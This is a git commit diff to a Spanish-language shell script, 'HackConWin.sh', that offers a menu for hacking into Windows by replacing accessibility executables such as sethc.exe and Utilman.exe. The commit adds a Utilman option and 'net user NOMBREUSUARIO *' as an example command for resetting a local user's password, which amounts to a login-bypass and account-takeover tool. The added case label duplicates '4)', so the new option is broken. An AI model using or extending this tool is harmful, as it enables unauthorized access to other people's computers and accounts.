5d59eeea602ef677a45cccbf1d8e8d72e93597b6
Jack Napier <jacknapier151@gmail.com>
2019-12-25 12:45:27 +0100

    Nueva Opcion

--- Scripts/HackConWin.sh
+++ Scripts/HackConWin.sh
@@ -16,6 +16,7 @@ echo " 1.-Hackear por ost.exe (Teclado Virtual)"
 echo " 2.-Hackear por sethc.exe (Teclas Especiales)"
 echo " 3.-Hackear por magnify.exe (Lupa)"
 echo " 4.-Hackear por Narrator.exe (Narrador)"
+echo " 5.-Hackear por Utilman.exe (Utilman)"
 echo " 0.-Salir"
 echo " "
 read -p "OPCIÓN: " OPCION1
@@ -39,6 +40,7 @@ case $OPCION1 in
 	2)	ATAJO="sethc.exe";;
 	3)	ATAJO="magnify.exe";;
 	4)	ATAJO="Narrator.exe";;
+	4)	ATAJO="Utilman.exe";;
 	*) echo "Error: Opcion no valida. Saliendo"; exit 1 ;;
 	:) echo "Error: Está faltando un argumento en alguna parte. Saliendo"; exit 1 ;;
 	?) echo "Error: Indicador no válido en alguna parte. Saliendo"; exit 1 ;;
@@ -53,5 +55,8 @@ echo " COMPLETADO:"
 echo " Ejemplos:"
 echo " control"
 echo " lusrmgr.msc"
+echo ""
+echo " net user"
+echo " net user NOMBREUSUARIO *"
 
 exit 0
